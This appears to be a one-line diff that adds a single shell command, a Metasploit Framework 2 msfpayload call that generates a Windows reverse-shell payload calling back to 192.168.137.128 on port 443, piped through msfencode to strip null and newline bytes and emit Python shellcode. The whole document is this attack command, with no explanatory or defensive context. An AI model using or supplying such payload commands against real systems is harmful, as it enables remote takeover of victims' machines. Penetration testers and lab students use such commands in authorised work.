@@ -1,0 +1,1 @@
+/usr/share/framework2/msfpayload win32_reverse LHOST=192.168.137.128 LPORT=443 R | /usr/share/framework2/msfencode -b '\x00\x0a\x0d' -t python
